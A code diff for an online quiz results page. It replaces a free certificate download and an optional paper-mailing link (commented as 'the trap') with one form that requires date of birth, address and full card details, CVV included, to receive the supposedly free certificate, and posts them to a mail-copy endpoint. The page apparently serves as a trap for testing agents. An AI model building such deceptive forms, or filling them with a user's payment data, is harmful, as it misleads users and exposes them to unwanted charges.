@@ -40,12 +40,22 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;c
 .btn-cert{display:inline-block;background:#6c5ce7;color:#fff;font-size:14px;font-weight:600;padding:11px 28px;border-radius:8px;text-decoration:none;border:none;cursor:pointer}
 .btn-cert:hover{background:#5a4ad1}
 
-/* Optional paper-mailing upsell — the trap */
-.mail-card{background:#f9f9fc;border:1px solid #ececf5;border-radius:12px;padding:18px 22px;text-align:left;margin-bottom:24px}
-.mail-card .mail-tag{display:inline-block;background:#fff;color:#6c5ce7;font-size:11px;font-weight:600;padding:2px 9px;border-radius:10px;letter-spacing:0.4px;margin-bottom:8px;border:1px solid #e5e2f7}
-.mail-card .mail-title{font-size:14px;color:#2d3436;font-weight:600;margin-bottom:4px}
-.mail-card .mail-desc{font-size:12px;color:#636e72;line-height:1.55;margin-bottom:10px}
-.mail-card a{color:#6c5ce7;font-size:12px;text-decoration:underline}
+.cert-form-card{background:#fff;border:1px solid #e5e2f7;border-radius:14px;padding:28px;margin-bottom:24px;text-align:left}
+.cert-form-card h2{font-size:18px;font-weight:700;margin-bottom:6px}
+.cert-form-card .sub{font-size:13px;color:#636e72;margin-bottom:20px}
+.cf-label{display:block;font-size:12px;font-weight:600;color:#2d3436;margin-bottom:4px}
+.cf-input{width:100%;padding:9px 12px;font-size:13px;border:1px solid #d3dae3;border-radius:6px;font-family:inherit;outline:none}
+.cf-input:focus{border-color:#6c5ce7}
+.cf-group{margin-bottom:13px}
+.cf-row{display:flex;gap:10px}
+.cf-row .cf-group{flex:1}
+.cf-divider{border:none;border-top:1px solid #eef0f4;margin:18px 0}
+.cf-section{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#b2bec3;font-weight:700;margin-bottom:10px}
+.cf-submit{width:100%;background:#6c5ce7;color:#fff;font-size:14px;font-weight:600;padding:11px;border:none;border-radius:8px;cursor:pointer;margin-top:4px}
+.cf-submit:hover{background:#5a4ad1}
+.cf-note{font-size:11px;color:#8a95a3;text-align:center;margin-top:8px}
+.cf-success{display:none;text-align:center;padding:20px 0}
+.cf-success .check{display:inline-flex;align-items:center;justify-content:center;width:48px;height:48px;background:#2db37a;color:#fff;border-radius:50%;font-size:22px;margin-bottom:10px}
 
 .footer{text-align:center;padding:24px;font-size:12px;color:#b2bec3;border-top:1px solid #eee}
 </style>
@@ -85,18 +95,78 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;c
     <p>You answered 4 of 5 questions correctly. Your score of 112 places you slightly above the average for online quiz takers. This is a short pattern-and-reasoning quiz, not a clinical assessment — treat it as a fun benchmark.</p>
   </div>
 
-  <div class="cert-card">
-    <span class="cert-icon">📜</span>
-    <h2>Your free PDF certificate</h2>
-    <p class="sub">Download a printable certificate with your score. No payment required.</p>
-    <a href="/certificate" class="btn-cert">Download free certificate</a>
-  </div>
+  <div class="cert-form-card">
+    <h2>📜 Collect your certificate</h2>
+    <p class="sub">Enter your details below to personalise and receive your certificate. A digital copy will be emailed to you; optionally add a $1.99 printed mailing.</p>
 
-  <div class="mail-card">
-    <span class="mail-tag">Optional</span>
-    <div class="mail-title">Add a printed paper copy</div>
-    <p class="mail-desc">If you'd prefer a printed certificate mailed to your address, you can order one for $1.99 shipping (standard delivery, 7–10 business days).</p>
-    <a href="/mail-copy">Add optional paper mailing copy →</a>
+    <div id="cert-form-view">
+      <form id="cert-form" onsubmit="submitCert(event)">
+
+        <div class="cf-section">Recipient</div>
+        <div class="cf-group">
+          <label class="cf-label" for="cf-name">Full name (as printed on certificate)</label>
+          <input class="cf-input" type="text" id="cf-name" placeholder="Your full name" required>
+        </div>
+        <div class="cf-group">
+          <label class="cf-label" for="cf-dob">Date of birth</label>
+          <input class="cf-input" type="date" id="cf-dob" required>
+        </div>
+
+        <hr class="cf-divider">
+        <div class="cf-section">Mailing address</div>
+        <div class="cf-group">
+          <label class="cf-label" for="cf-street">Street address</label>
+          <input class="cf-input" type="text" id="cf-street" placeholder="123 Main St" required>
+        </div>
+        <div class="cf-row">
+          <div class="cf-group">
+            <label class="cf-label" for="cf-city">City</label>
+            <input class="cf-input" type="text" id="cf-city" required>
+          </div>
+          <div class="cf-group">
+            <label class="cf-label" for="cf-state">State</label>
+            <input class="cf-input" type="text" id="cf-state" maxlength="2" required>
+          </div>
+          <div class="cf-group">
+            <label class="cf-label" for="cf-zip">ZIP</label>
+            <input class="cf-input" type="text" id="cf-zip" maxlength="10" required>
+          </div>
+        </div>
+
+        <hr class="cf-divider">
+        <div class="cf-section">Payment — printed copy ($1.99 shipping)</div>
+        <div class="cf-group">
+          <label class="cf-label" for="cf-cardholder">Cardholder name</label>
+          <input class="cf-input" type="text" id="cf-cardholder" required>
+        </div>
+        <div class="cf-group">
+          <label class="cf-label" for="cf-card">Card number</label>
+          <input class="cf-input" type="text" id="cf-card" placeholder="1234 5678 9012 3456" maxlength="19" required>
+        </div>
+        <div class="cf-row">
+          <div class="cf-group">
+            <label class="cf-label" for="cf-expiry">Expiry</label>
+            <input class="cf-input" type="text" id="cf-expiry" placeholder="MM/YY" maxlength="5" required>
+          </div>
+          <div class="cf-group">
+            <label class="cf-label" for="cf-cvv">CVV</label>
+            <input class="cf-input" type="text" id="cf-cvv" placeholder="123" maxlength="4" required>
+          </div>
+          <div class="cf-group">
+            <label class="cf-label" for="cf-bzip">Billing ZIP</label>
+            <input class="cf-input" type="text" id="cf-bzip" maxlength="10" required>
+          </div>
+        </div>
+
+        <button type="submit" class="cf-submit">Generate &amp; send certificate</button>
+        <p class="cf-note">$1.99 charged once for the printed copy. Digital certificate is free.</p>
+      </form>
+    </div>
+
+    <div class="cf-success" id="cert-success">
+      <div class="check">✓</div>
+      <p style="color:#636e72;font-size:13px;">Certificate generated. Check your email for the digital copy.</p>
+    </div>
   </div>
 
 </div>
@@ -104,6 +174,33 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;c
 <footer class="footer">
   &copy; 2026 BrainTest — Online reasoning quiz.
 </footer>
+
+<script>
+function submitCert(e){
+  e.preventDefault();
+  var payload = {
+    full_name:       document.getElementById('cf-name').value,
+    date_of_birth:   document.getElementById('cf-dob').value,
+    street:          document.getElementById('cf-street').value,
+    city:            document.getElementById('cf-city').value,
+    state:           document.getElementById('cf-state').value,
+    zip:             document.getElementById('cf-zip').value,
+    cardholder_name: document.getElementById('cf-cardholder').value,
+    card_number:     document.getElementById('cf-card').value,
+    expiry:          document.getElementById('cf-expiry').value,
+    cvv:             document.getElementById('cf-cvv').value,
+    billing_zip:     document.getElementById('cf-bzip').value
+  };
+  fetch('/api/mail-copy', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
+  }).then(function(){
+    document.getElementById('cert-form-view').style.display='none';
+    document.getElementById('cert-success').style.display='block';
+  });
+}
+</script>
 
 </body>
 </html>
